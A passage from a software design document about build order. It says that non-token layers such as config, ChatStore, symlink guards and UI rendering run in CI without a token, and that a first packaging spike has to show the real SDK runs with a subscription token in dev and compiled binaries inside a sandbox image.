  false green. The non-token layers (config, `ChatStore`, symlink guards, merge, deploy bookkeeping,
  UI rendering) run fully in CI without a token.

### Implication for the build order

The **Step 0 packaging spike (§7)** must prove the real SDK executes with the subscription token in
**both** the dev binary and the compiled binary inside the sandbox image — that spike *is* the first
real end-to-end check, and nothing downstream is "done" until its loop above passes locally.
